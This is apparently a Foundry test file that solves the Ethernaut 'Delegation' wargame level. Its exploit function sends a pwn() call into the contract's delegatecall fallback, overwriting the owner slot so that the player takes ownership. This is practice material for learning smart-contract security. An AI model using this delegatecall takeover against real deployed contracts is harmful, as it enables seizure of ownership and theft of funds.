// SPDX-License-Identifier: Unlicense
pragma solidity >=0.6.0;
pragma experimental ABIEncoderV2;

import "./utils/BaseTest.sol";
import "src/levels/Delegation.sol";
import "src/levels/DelegationFactory.sol";

contract TestDelegation is BaseTest {
    Delegation private level;

    constructor() public {
        // SETUP LEVEL FACTORY
        levelFactory = new DelegationFactory();
    }

    function setUp() public override {
        // Call the BaseTest setUp() function that will also create testsing accounts
        super.setUp();
    }

    function testRunLevel() public {
        runLevel();
    }

    function setupLevel() internal override {
        /**
         * CODE YOUR SETUP HERE
         */
        levelAddress = payable(this.createLevelInstance(true));
        level = Delegation(levelAddress);

        // Check that the contract is correctly setup
        assertEq(level.owner(), address(levelFactory));
    }

    function exploitLevel() internal override {
        /**
         * CODE YOUR EXPLOIT HERE
         */

        // Delegation contract delegateCalls the Delegate contract during fallback()
        // If we call Delegation contract and provide the pwn() function signature, Delegation contract will delegateCall the pwn() function of the Delegate contract
        // This call will change the slot 0 of Delegation contract to be msg.sender - which is the player address

        vm.startPrank(player, player);

        // Call the Delegation contract with the pwn() function signature
        bytes memory data = abi.encodeWithSignature("pwn()");
        address(level).call(data);

        vm.stopPrank();
    }
}
